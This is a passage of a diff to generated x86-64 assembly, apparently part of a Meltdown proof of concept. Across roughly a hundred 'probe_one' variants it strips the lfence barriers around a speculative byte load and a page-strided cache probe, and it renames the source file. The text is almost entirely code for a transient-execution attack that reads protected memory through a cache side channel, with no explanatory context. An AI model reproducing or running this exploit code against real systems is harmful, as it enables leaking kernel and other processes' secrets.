 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 403
@@ -5546,10 +4742,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 404
@@ -5557,10 +4751,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 405
@@ -5568,10 +4760,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 406
@@ -5579,10 +4769,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 407
@@ -5590,10 +4778,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 408
@@ -5601,10 +4787,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 409
@@ -5612,10 +4796,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 410
@@ -5623,10 +4805,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 411
@@ -5634,10 +4814,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 412
@@ -5645,10 +4823,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 413
@@ -5656,10 +4832,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 414
@@ -5667,10 +4841,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 415
@@ -5678,10 +4850,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 416
@@ -5689,10 +4859,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 417
@@ -5700,10 +4868,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 418
@@ -5711,10 +4877,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 419
@@ -5722,10 +4886,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 420
@@ -5733,10 +4895,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 421
@@ -5744,10 +4904,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 422
@@ -5755,10 +4913,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 423
@@ -5766,10 +4922,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 424
@@ -5777,10 +4931,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 425
@@ -5788,10 +4940,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 426
@@ -5799,10 +4949,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 427
@@ -5810,10 +4958,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 428
@@ -5821,10 +4967,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 429
@@ -5832,10 +4976,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 430
@@ -5843,10 +4985,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 431
@@ -5854,10 +4994,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 432
@@ -5865,10 +5003,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 433
@@ -5876,10 +5012,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 434
@@ -5887,10 +5021,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 435
@@ -5898,10 +5030,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 436
@@ -5909,10 +5039,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 437
@@ -5920,10 +5048,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 438
@@ -5931,10 +5057,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 439
@@ -5942,10 +5066,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 440
@@ -5953,10 +5075,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 441
@@ -5964,10 +5084,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 442
@@ -5975,10 +5093,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 443
@@ -5986,10 +5102,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 444
@@ -5997,10 +5111,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 445
@@ -6008,10 +5120,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 446
@@ -6019,10 +5129,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 447
@@ -6030,10 +5138,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 448
@@ -6041,10 +5147,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 449
@@ -6052,10 +5156,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 450
@@ -6063,10 +5165,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 451
@@ -6074,10 +5174,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 452
@@ -6085,10 +5183,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 453
@@ -6096,10 +5192,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 454
@@ -6107,10 +5201,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 455
@@ -6118,10 +5210,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 456
@@ -6129,10 +5219,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 457
@@ -6140,10 +5228,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 458
@@ -6151,10 +5237,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 459
@@ -6162,10 +5246,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 460
@@ -6173,10 +5255,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 461
@@ -6184,10 +5264,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 462
@@ -6195,10 +5273,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 463
@@ -6206,10 +5282,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 464
@@ -6217,10 +5291,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 465
@@ -6228,10 +5300,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 466
@@ -6239,10 +5309,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 467
@@ -6250,10 +5318,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 468
@@ -6261,10 +5327,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 469
@@ -6272,10 +5336,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 470
@@ -6283,10 +5345,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 471
@@ -6294,10 +5354,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 472
@@ -6305,10 +5363,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 473
@@ -6316,10 +5372,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 474
@@ -6327,10 +5381,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 475
@@ -6338,10 +5390,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 476
@@ -6349,10 +5399,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 477
@@ -6360,10 +5408,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 478
@@ -6371,10 +5417,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 479
@@ -6382,10 +5426,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 480
@@ -6393,10 +5435,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 481
@@ -6404,10 +5444,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 482
@@ -6415,10 +5453,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 483
@@ -6426,10 +5462,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 484
@@ -6437,10 +5471,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 485
@@ -6448,10 +5480,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 486
@@ -6459,10 +5489,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 487
@@ -6470,10 +5498,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 488
@@ -6481,10 +5507,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 489
@@ -6492,10 +5516,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 490
@@ -6503,10 +5525,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 491
@@ -6514,10 +5534,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 492
@@ -6525,10 +5543,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 493
@@ -6536,10 +5552,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 494
@@ -6547,10 +5561,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 495
@@ -6558,10 +5570,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 496
@@ -6569,10 +5579,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 497
@@ -6580,10 +5588,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 498
@@ -6591,10 +5597,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 499
@@ -6602,10 +5606,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 .Lprobe_one_win0_continue:
@@ -6625,7 +5627,7 @@ __speculative_byte_load_exit:
 	movq	-2344(%rbp), %rax
 	movq	%rax, %rcx
 #APP
-# 120 "meltdown50.c" 1
+# 120 "meltdownFrichetten.c" 1
 	mfence
 	lfence
 	rdtsc
